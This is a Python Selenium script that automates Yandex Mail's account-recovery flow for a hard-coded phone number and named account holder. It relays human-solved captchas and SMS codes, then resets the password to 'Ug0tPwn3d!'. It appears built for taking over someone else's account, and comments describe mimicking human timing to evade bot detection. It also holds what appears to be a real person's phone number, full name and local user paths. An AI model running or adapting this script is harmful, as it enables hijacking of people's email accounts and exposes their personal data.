import os, platform, sys
from time import sleep

try:
    from selenium import webdriver  
    from selenium.webdriver.common.keys import Keys  
    from selenium.common.exceptions import TimeoutException
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options  
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.common.exceptions import NoSuchElementException, TimeoutException, StaleElementReferenceException
except (ImportError, ModuleNotFoundError) as e:
    # Install missing library and import again
    # os.system("sudo -H " + sys.executable + " -m pip install selenium")
    print("Please install selenium")
    print("pip3 install --upgrade selenium")
    exit()


# arg_phone_number = input("Please enter the phone number: ")
# arg_fname = input("Please enter account holder's first name: ")
# arg_lname = input("Please enter account holder's last name:  ")

arg_phone_number = "3215442490"
arg_fname = "Monica"
arg_lname = "Bernard"

chrome_options = Options()  

## Uncomment the follow to run without GUI, needed in server environment
# chrome_options.add_argument("--headless") 

# Log level: 0: info, 1: warnings, 2: log_error, 3: log_fatal
chrome_options.add_argument('log-level=3')

# chrome_options.binary_location needs to point to Google Chrome Canary executable
if platform.system() == "Windows": 
    chrome_options.binary_location = 'C:\\Users\\kbernard\\AppData\\Local\\Google\\Chrome SxS\\Application\\chrome.exe'
    driver = webdriver.Chrome(executable_path="chromedriver.exe",   options=chrome_options)  
elif platform.system() == "Darwin":
    chrome_options.binary_location = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 
    driver = webdriver.Chrome(executable_path="/Users/aahana/Downloads/chromedriver",   options=chrome_options)  
elif platform.system() == "Linux":
    chrome_options.binary_location = '/usr/bin/google-chrome' 
    driver = webdriver.Chrome(executable_path="chromedriver_linux",   options=chrome_options)  

# We want to mimic human clicks and navigation

url1 = "https://mail.yandex.com/"

driver.get(url1)

a_tags = driver.find_elements_by_tag_name('a')

# Find the login link
for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Log in"):
        login_link = a_tag.get_attribute('href')

print("Navigating to login page...")
# Add fake wait time to make it look more human, bots are faster
WebDriverWait(driver, 0.1) 
driver.get(login_link)

# Find the forgot login link
a_tags = driver.find_elements_by_tag_name('a')
for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Forgot your login?"):
        forgot_login_link = a_tag.get_attribute('href')

print("Navigating to forgot login page...")
WebDriverWait(driver, 0.1) # Add fake wait time to make it look more human, bots are faster
driver.get(forgot_login_link)

# Locate the captcha image
text_inputs = driver.find_elements_by_class_name("textinput__control")

input_phone_num = text_inputs[0]
input_captcha = text_inputs[1]

# mimic user input by sending keystrokes
input_phone_num.send_keys(arg_phone_number)

# Get the captcha text from the user
error = True

while error:
    captcha = driver.find_element_by_class_name("captcha__image")
    captcha_src = captcha.get_attribute('src')
    # print("Captcha:", captcha_src)

    captcha_text = input('Please enter text from this captcha: '  + captcha_src + "\n")
    input_captcha.send_keys(Keys.COMMAND + "a")
    input_captcha.send_keys(Keys.DELETE)
    # mimic user input by sending keystrokes
    input_captcha.send_keys(captcha_text)

    # Find submit button
    buttons = driver.find_elements_by_tag_name("button")
    for button in buttons:
        if (button.get_attribute("type") == "submit"):
            submit_button = button

    submit_button.send_keys(Keys.ENTER)

    sleep(1)

    try:
        wait = WebDriverWait(driver, 2)
        error = wait.until(EC.text_to_be_present_in_element((By.TAG_NAME, "div"), "The text you entered does not match the code"))
        if error:
            sleep(1)
            print("You entered wrong text, try again.")

            for i in range(len(captcha_text)):
                input_captcha.send_keys(Keys.BACK_SPACE)
    except (NoSuchElementException, TimeoutException, StaleElementReferenceException) as e:
        error = False
        print("Captcha accepted! You will recieve a code soon ")

sleep(2)

code_recieved = False
while not code_recieved:
    code = input("Enter the code: ")
    code_timer = driver.find_elements_by_class_name("login-restore__countdown")
    if len(code_timer) > 0:    
        code_input = driver.find_element_by_class_name("textinput__control")
        code_input.send_keys(code)
        buttons = driver.find_elements_by_tag_name("button")
        for button in buttons:
            if (button.get_attribute("type") == "submit"):
                submit_button = button
        submit_button.send_keys(Keys.ENTER)
        code_recieved = True
    else:
        resend_code_elem = driver.find_element_by_xpath("//span[.='Resend code']")
        resend_code_elem.click()
        code = input("Times, up. Press enter the new code...")
        

sleep(2)

name_inputs = driver.find_elements_by_class_name("textinput__control")
input_firstName = name_inputs[0]
input_surName = name_inputs[1]

# mimic user input by sending keystrokes
input_firstName.send_keys(arg_fname)
input_surName.send_keys(arg_lname)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("type") == "submit"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)

sleep(2)

a_tags = driver.find_elements_by_tag_name('a')

for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Forgot your password?"):
        forgot_password = a_tag.get_attribute('href')

WebDriverWait(driver, 0.1) # Add fake wait time to make it look more human, bots are faster
driver.get(forgot_password)

sleep(2)


wrong_captcha = True

while wrong_captcha:
    captcha = driver.find_element_by_class_name("captcha__captcha__text")
    captcha_src = captcha.get_attribute('src')
    captcha_text = input('Please enter text from this captcha: '  + captcha_src + "\n")

    input_tags = driver.find_elements_by_tag_name("input")
    for input_tag in input_tags:
        if (input_tag.get_attribute("placeholder") == "Enter the characters"):
            captcha_input = input_tag

    captcha_input.send_keys(Keys.COMMAND + "a")
    captcha_input.send_keys(Keys.DELETE)
    captcha_input.send_keys(captcha_text)

    sleep(1)
    # Find submit button
    buttons = driver.find_elements_by_tag_name("button")
    for button in buttons:
        if (button.get_attribute("type") == "submit"):
            submit_button = button
    
    submit_button.send_keys(Keys.ENTER)

    try:
        wait = WebDriverWait(driver, 2)
        error = wait.until(EC.text_to_be_present_in_element((By.TAG_NAME, "div"), "The characters were entered incorrectly. Please try again"))
        if error:
            sleep(1)
            print("You entered wrong text, try again.")

            for i in range(len(captcha_text)):
                captcha_input.send_keys(Keys.BACK_SPACE)
    except (NoSuchElementException, TimeoutException, StaleElementReferenceException) as e:
        error = False
        print("Captcha accepted!")
        wrong_captcha = False


sleep(3)

input_tags = driver.find_elements_by_tag_name("input")
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Your phone number"):
        phone_number = input_tag
phone_number.send_keys(arg_phone_number)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-2"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)

sleep(2)

code = input("Enter the code: ")
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Confirmation code from SMS"):
        code_input = input_tag
code_input.send_keys(code)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-3"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)
sleep(2)

New_password = "Ug0tPwn3d!"
input_tags = driver.find_elements_by_tag_name("input")
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Enter a\xa0password"):
        reset_password = input_tag
reset_password.send_keys(New_password)

sleep(1)

for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Reenter to\xa0confirm"):
        reset_password_confirm = input_tag
reset_password_confirm.send_keys(New_password)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-2"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)
# driver.close()
